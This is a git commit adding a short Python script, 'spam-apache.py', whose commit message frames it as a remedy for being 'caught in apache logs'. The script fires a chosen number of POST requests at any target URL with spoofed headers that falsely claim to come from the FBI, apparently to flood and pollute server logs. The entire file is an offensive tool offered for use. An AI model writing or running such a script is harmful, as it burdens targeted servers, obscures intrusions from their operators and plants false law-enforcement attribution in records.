1310d7cb78814820cb7bcb11ed2db2e4b5c4a424
Eitenne <finnurs@protonmail.ch>
2018-01-16 20:53:03 +0100

    Add files via upload
    When you get caught in apache logs etc.

---
+++ spam-apache.py
@@ -0,0 +1,21 @@
+#!/usr/bin/python
+
+import requests
+import sys
+
+#/* Headers */
+headers = {
+    'User-Agent': 'FBI WAS HERE',
+    'From': 'warrant@fbi.gov'
+}
+
+def main():
+	if len(sys.argv) == 3:
+		target = sys.argv[1]
+		amount = sys.argv[2]
+		for x in range(int(amount)):
+			r = requests.post(target, headers=headers)
+			print "[*] Sending %s requests" % (x)
+	else:
+		print "./%s <target> <amount>" % (sys.argv[0])
+main()
